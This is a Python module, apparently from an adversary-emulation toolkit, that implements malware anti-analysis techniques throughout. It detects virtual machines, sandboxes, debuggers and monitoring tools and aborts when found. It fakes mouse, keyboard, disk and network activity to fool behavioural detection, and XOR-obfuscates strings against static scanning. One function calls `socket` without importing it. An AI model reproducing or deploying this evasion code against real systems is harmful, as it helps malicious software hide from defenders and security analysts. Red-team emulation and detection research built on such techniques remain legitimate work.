# Advanced Evasion Module
# Implements advanced anti-detection and evasion techniques

import os
import sys
import time
import random
import hashlib
import threading
import subprocess
import ctypes
from datetime import datetime
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager

class EvasionManager:
    """Handles advanced evasion techniques"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.evasion_active = False
        self.behavioral_patterns = []
        self.detection_counters = {
            'sandbox': 0,
            'vm': 0,
            'debugger': 0,
            'analysis': 0
        }
        
    def initialize_evasion(self):
        """Initialize all evasion techniques"""
        self.evasion_active = True
        
        # Start evasion threads
        if self.is_windows:
            self._start_evasion_threads()
        
        if DEBUG_MODE:
            stealth_manager.safe_execute(
                lambda: print("Advanced evasion initialized")
            )
        
        return True
    
    def _start_evasion_threads(self):
        """Start background evasion threads"""
        try:
            # Thread to simulate normal user activity
            self.user_activity_thread = threading.Thread(
                target=self._simulate_user_activity,
                daemon=True
            )
            self.user_activity_thread.start()
            
            # Thread for process hollowing detection avoidance
            self.process_monitor_thread = threading.Thread(
                target=self._monitor_process_changes,
                daemon=True
            )
            self.process_monitor_thread.start()
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Evasion thread initialization failed: {e}")
                )
    
    def _simulate_user_activity(self):
        """Simulate normal user activity to avoid behavioral detection"""
        activities = [
            self._simulate_mouse_movement,
            self._simulate_keyboard_activity,
            self._simulate_disk_activity,
            self._simulate_network_activity
        ]
        
        while self.evasion_active:
            try:
                # Randomly select an activity
                activity = random.choice(activities)
                activity()
                
                # Random delay
                time.sleep(random.uniform(30, 120))
                
            except Exception:
                time.sleep(60)
    
    def _simulate_mouse_movement(self):
        """Simulate mouse movement (Windows)"""
        if not self.is_windows:
            return
        
        try:
            import win32api
            import win32con
            
            # Get current mouse position
            x, y = win32api.GetCursorPos()
            
            # Small random movement
            dx = random.randint(-10, 10)
            dy = random.randint(-10, 10)
            
            # Move mouse
            win32api.mouse_event(
                win32con.MOUSEEVENTF_MOVE | win32con.MOUSEEVENTF_ABSOLUTE,
                int((x + dx) * 65535 / win32api.GetSystemMetrics(0)),
                int((y + dy) * 65535 / win32api.GetSystemMetrics(1)),
                0, 0
            )
            
        except Exception:
            pass
    
    def _simulate_keyboard_activity(self):
        """Simulate random keyboard activity"""
        try:
            # Send a virtual keystroke
            if self.is_windows:
                ctypes.windll.user32.keybd_event(0, 0, 0, 0)
                time.sleep(0.1)
                ctypes.windll.user32.keybd_event(0, 0, 2, 0)
            
        except Exception:
            pass
    
    def _simulate_disk_activity(self):
        """Simulate disk read/write activity"""
        try:
            # Read a system file
            test_files = [
                'C:\\Windows\\system.ini',
                'C:\\Windows\\win.ini',
                os.path.expanduser('~\\ntuser.dat')
            ]
            
            for test_file in test_files:
                if os.path.exists(test_file):
                    with open(test_file, 'rb') as f:
                        f.read(1024)
                    break
            
        except Exception:
            pass
    
    def _simulate_network_activity(self):
        """Simulate network activity"""
        try:
            # Make a DNS request
            socket.gethostbyname('www.microsoft.com')
        except Exception:
            pass
    
    def _monitor_process_changes(self):
        """Monitor for process monitoring tools"""
        while self.evasion_active:
            try:
                if self._check_process_monitors():
                    self._evade_process_monitors()
                
                time.sleep(random.uniform(5, 15))
                
            except Exception:
                time.sleep(30)
    
    def _check_process_monitors(self):
        """Check for process monitoring tools"""
        monitors = [
            'procmon.exe', 'procexp.exe', 'processhacker.exe',
            'autoruns.exe', 'procEXP.exe', 'sysmon.exe'
        ]
        
        try:
            import psutil
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in monitors:
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _evade_process_monitors(self):
        """Evade detected process monitors"""
        try:
            # Random delay
            time.sleep(random.uniform(60, 180))
            
            # Change timing patterns
            stealth_manager.add_jitter(30, 120)
            
        except Exception:
            pass
    
    def check_sandbox_environment(self):
        """Advanced sandbox detection"""
        indicators = []
        
        # Check VM artifacts
        vm_indicators = self._detect_vm_advanced()
        indicators.extend(vm_indicators)
        
        # Check sandbox-specific behaviors
        sandbox_indicators = self._detect_sandbox_specific()
        indicators.extend(sandbox_indicators)
        
        # Check for analysis tools
        analysis_indicators = self._detect_analysis_tools_advanced()
        indicators.extend(analysis_indicators)
        
        self.detection_counters['sandbox'] = len(indicators)
        
        return indicators
    
    def _detect_vm_advanced(self):
        """Advanced VM detection"""
        indicators = []
        
        try:
            # Check hardware breakpoints (hypervisor signatures)
            if self._check_hypervisor():
                indicators.append('Hypervisor detected')
            
            # Check CPU features
            if self._check_cpu_features():
                indicators.append('VM CPU features detected')
            
            # Check for VM-specific processes
            vm_processes = [
                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                'hgfs.exe', 'vmhgfs.exe'
            ]
            
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
                    indicators.append(f"VM process: {proc.info['name']}")
            
            # Check registry for VM signs
            vm_registry_keys = [
                r'HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools',
                r'HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions',
                r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VBoxGuest',
                r'HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer'
            ]
            
            for key in vm_registry_keys:
                if 'VMware' in key or 'VirtualBox' in key:
                    if self._check_registry_key(key):
                        indicators.append(f"VM registry: {key}")
            
            # Check MAC address prefix for VM vendors
            mac_prefixes = {
                '00:0C:29': 'VMware',
                '00:50:56': 'VMware',
                '00:15:5D': 'Hyper-V',
                '08:00:27': 'VirtualBox',
                '00:1C:42': 'Parallels'
            }
            
            mac_prefix = self._get_mac_prefix()
            if mac_prefix in mac_prefixes:
                indicators.append(f"VM MAC address: {mac_prefixes[mac_prefix]}")
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Advanced VM detection failed: {e}")
                )
        
        self.detection_counters['vm'] = len(indicators)
        return indicators
    
    def _check_hypervisor(self):
        """Check for hypervisor using CPUID"""
        if not self.is_windows:
            return False
        
        try:
            # Use CPUID to check for hypervisor
            ctypes.windll.kernel32.GetNativeSystemInfo.restype = None
            
            # Check via registry as fallback
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SYSTEM\\CurrentControlSet\\Enum\\ACPI'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if 'VMware' in result.stdout or 'VirtualBox' in result.stdout:
                return True
                
        except Exception:
            pass
        
        return False
    
    def _check_cpu_features(self):
        """Check CPU features for VM signatures"""
        try:
            # Check CPU brand string
            if self.is_windows:
                result = subprocess.run(
                    ['wmic', 'cpu', 'get', 'name'],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                cpu_name = result.stdout.lower()
                if 'virtual' in cpu_name or 'vmware' in cpu_name or 'hyper-v' in cpu_name:
                    return True
            
        except Exception:
            pass
        
        return False
    
    def _check_registry_key(self, key_path):
        """Check if registry key exists"""
        try:
            result = subprocess.run(
                ['reg', 'query', key_path],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def _get_mac_prefix(self):
        """Get the MAC address prefix of the current interface"""
        try:
            import psutil
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.replace(':', '').upper()[:6]
                        return ':'.join([mac[i:i+2] for i in range(0, 6, 2)])
        except Exception:
            pass
        return None
    
    def _detect_sandbox_specific(self):
        """Detect sandbox-specific behaviors and artifacts"""
        indicators = []
        
        try:
            # Check for suspicious timing
            boot_time = self._get_system_boot_time()
            if boot_time:
                # Fresh boot might indicate sandbox
                if boot_time < 300:  # Less than 5 minutes
                    indicators.append('Recent system boot')
            
            # Check disk size (sandbox often has small disks)
            disk = self._get_disk_size()
            if disk and disk < 60:  # Less than 60GB
                indicators.append(f'Small disk: {disk}GB')
            
            # Check RAM (sandbox often has limited RAM)
            ram = self._get_ram_size()
            if ram and ram < 4:  # Less than 4GB
                indicators.append(f'Low RAM: {ram}GB')
            
            # Check for known sandbox processes
            sandbox_processes = [
                'sandboxie.exe', 'sandboxiedcomlaunch.exe',
                'malware.exe', 'sample.exe', 'test.exe'
            ]
            
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in sandbox_processes:
                    indicators.append(f'Sandbox process: {proc.info["name"]}')
                    
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Sandbox detection failed: {e}")
                )
        
        return indicators
    
    def _get_system_boot_time(self):
        """Get system boot time in seconds"""
        try:
            import psutil
            boot_time = psutil.boot_time()
            current_time = time.time()
            return current_time - boot_time
        except Exception:
            return None
    
    def _get_disk_size(self):
        """Get system disk size in GB"""
        try:
            import psutil
            disk = psutil.disk_usage('/')
            return disk.total / (1024**3)
        except Exception:
            return None
    
    def _get_ram_size(self):
        """Get system RAM size in GB"""
        try:
            import psutil
            return psutil.virtual_memory().total / (1024**3)
        except Exception:
            return None
    
    def _detect_analysis_tools_advanced(self):
        """Advanced analysis tool detection"""
        indicators = []
        
        analysis_tools = {
            'debuggers': [
                'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe',
                'ida64.exe', 'idaw.exe', 'id64.exe'
            ],
            'sandboxes': [
                'sandboxie.exe', 'cuckoo.exe', 'malware.exe'
            ],
            'monitors': [
                'procmon.exe', 'procexp.exe', 'regmon.exe',
                'filemon.exe', 'apimonitor.exe'
            ],
            'network': [
                'wireshark.exe', 'fiddler.exe', 'tcpview.exe',
                'netmon.exe', 'ethereal.exe'
            ]
        }
        
        try:
            import psutil
            
            for category, tools in analysis_tools.items():
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'] and proc.info['name'].lower() in tools:
                        indicators.append(f"{category}: {proc.info['name']}")
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Analysis tool detection failed: {e}")
                )
        
        self.detection_counters['analysis'] = len(indicators)
        return indicators
    
    def obfuscate_strings(self, strings):
        """Obfuscate strings to avoid static detection"""
        obfuscated = []
        
        for s in strings:
            # XOR obfuscation
            obfuscated.append(self._xor_obfuscate(s))
        
        return obfuscated
    
    def _xor_obfuscate(self, s, key='APT_EMULATOR'):
        """XOR obfuscate a string"""
        result = []
        key_len = len(key)
        
        for i, char in enumerate(s):
            result.append(chr(ord(char) ^ ord(key[i % key_len])))
        
        return ''.join(result)
    
    def deobfuscate_strings(self, strings):
        """Deobfuscate strings"""
        deobfuscated = []
        
        for s in strings:
            deobfuscated.append(self._xor_obfuscate(s))
        
        return deobfuscated
    
    def randomize_timing(self, base_interval, variance=0.3):
        """Generate random timing with variance"""
        min_delay = base_interval * (1 - variance)
        max_delay = base_interval * (1 + variance)
        return random.uniform(min_delay, max_delay)
    
    def should_abort(self):
        """Determine if execution should be aborted due to detection"""
        indicators = []
        
        # Check for VM/sandbox
        vm_indicators = self._detect_vm_advanced()
        indicators.extend(vm_indicators)
        
        # Check for sandbox
        sandbox_indicators = self._detect_sandbox_specific()
        indicators.extend(sandbox_indicators)
        
        # Check for analysis tools
        analysis_indicators = self._detect_analysis_tools_advanced()
        indicators.extend(analysis_indicators)
        
        # Abort if multiple indicators present
        if len(indicators) >= 3:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Execution aborted - detection indicators: {indicators}")
                )
            return True
        
        return False
    
    def get_detection_status(self):
        """Get current detection status"""
        return {
            'evasion_active': self.evasion_active,
            'detection_counters': self.detection_counters,
            'sandbox_indicators': len(self._detect_sandbox_specific()),
            'vm_indicators': len(self._detect_vm_advanced()),
            'analysis_indicators': len(self._detect_analysis_tools_advanced())
        }
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global evasion manager instance
evasion_manager = EvasionManager()
